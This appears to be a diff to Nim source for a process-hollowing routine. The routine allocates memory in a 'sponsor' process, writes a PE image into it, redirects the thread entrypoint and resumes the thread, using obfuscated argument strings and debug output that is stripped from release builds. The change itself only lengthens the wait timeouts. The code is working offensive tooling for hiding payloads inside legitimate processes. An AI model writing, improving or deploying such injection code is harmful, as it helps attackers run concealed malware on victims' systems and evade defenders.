@@ -345,7 +345,7 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     # Allocate memory in sponsor process
     when not defined(release): echo "[*] Allocating memory in sponsor process"     
     ppi = createProcessWorker(protectString(" -A:") & $sponsorProcessHandle)
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
@@ -358,7 +358,7 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     # Copy PE to sponsor process 
     when not defined(release): echo "[*] Copying PE to sponsor process"
     ppi = createProcessWorker(protectString(" -W:") & $sponsorProcessHandle & protectString(" -N:") & $cast[int](newImageBaseAddress))
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not write to sponsor process"
@@ -367,7 +367,7 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     # Change sponsor thread Entrypoint
     when not defined(release): echo "[*] Changing thread context"
     ppi = createProcessWorker(protectString(" -T:") & $sponsorThreadHandle & protectString(" -N:") & $cast[int](newImageBaseAddress))
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not change thread context"
@@ -376,7 +376,7 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming thread"
     ppi = createProcessWorker(protectString(" -R:") & $sponsorThreadHandle)
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not resume thread"
